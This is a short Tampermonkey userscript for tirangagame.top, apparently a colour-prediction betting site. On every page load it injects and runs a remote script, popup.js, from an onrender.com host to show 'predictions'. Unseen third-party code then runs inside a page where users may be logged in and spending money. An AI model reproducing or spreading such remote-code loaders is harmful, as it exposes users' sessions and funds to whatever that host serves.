// ==UserScript==
// @name         Tiranga Monitor
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Inject popup prediction
// @match        https://tirangagame.top/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';
    const script = document.createElement('script');
    script.src = 'https://tiranga-smart-predictor.onrender.com/static/popup.js';
    document.body.appendChild(script);
})();
